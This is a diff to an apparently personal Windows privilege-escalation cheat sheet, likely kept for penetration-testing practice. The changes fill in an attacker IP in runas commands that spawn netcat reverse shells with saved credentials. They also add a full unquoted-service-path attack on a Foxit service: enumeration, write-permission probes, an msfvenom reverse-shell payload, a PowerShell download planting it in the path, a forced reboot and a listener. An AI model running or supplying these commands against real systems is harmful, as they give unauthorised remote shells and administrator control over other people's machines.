@@ -242,8 +242,8 @@ Saved Creds
 cmdkey /list 
 runas /savecred /u:administrator cmd.exe
 runas /savecred /user:admin C:\PrivEsc\reverse.exe 
-C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc $IP 4444 -e cmd.exe" 
-runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
+C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.162.46 4444 -e cmd.exe" 
+runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 192.168.162.46 80 -e cmd.exe"
  
   
 ================================== 
@@ -264,6 +264,21 @@ dir %SYSTEMROOT%\System32\config\*S*
 
 Consider: mxsam
 
+================================== 
+Unquoted Service Path PrivEsc
+
+searchsploit foxit 7.
+dir "C:\Program Files (x86)" 
+sc qc FCUpdateService 
+wmic service get name, displayname, pathname, startmode |findstr /i "auto"| findstr /i /v "c:\windows\\" | findstr /i /v """ 
+echo ok > "C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\test.txt"
+echo ok > "C:\Program Files (x86)\Foxit Software\Foxit Reader\test.txt" 
+echo ok > "C:\Program Files (x86)\Foxit Software\test.txt" 
+echo ok > "C:\Program Files (x86)\test.txt" 
+msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 LHOST=192.168.162.46 LPORT=444 > rev.exe 
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.162.46/rev.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')" 
+shutdown -r -t 10 && exit 
+nc -nvlp 444
  
  
 ================================== 
